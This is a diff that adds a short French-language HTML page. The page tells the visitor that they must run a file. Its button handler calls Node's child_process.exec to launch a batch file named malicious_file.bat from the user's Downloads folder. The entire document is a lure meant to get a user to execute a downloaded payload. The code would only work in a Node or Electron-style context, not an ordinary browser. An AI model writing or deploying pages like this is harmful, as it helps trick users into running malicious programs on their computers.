@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exécuter un Fichier</title>
+</head>
+<body>
+    <h1>Vous devez exécuter ce fichier</h1>
+    <button id="executeFile">Exécuter le Fichier</button>
+
+    <script>
+        document.getElementById('executeFile').addEventListener('click', function() {
+            const filePath = 'C:\\Users\\%username%\\Downloads\\malicious_file.bat';
+            const exec = require('child_process').exec;
+            exec(filePath, (error, stdout, stderr) => {
+                if (error) {
+                    console.error(`Erreur: ${error.message}`);
+                    return;
+                }
+                if (stderr) {
+                    console.error(`Erreur: ${stderr}`);
+                    return;
+                }
+                console.log(`Sortie: ${stdout}`);
+            });
+        });
+    </script>
+</body>
+</html>
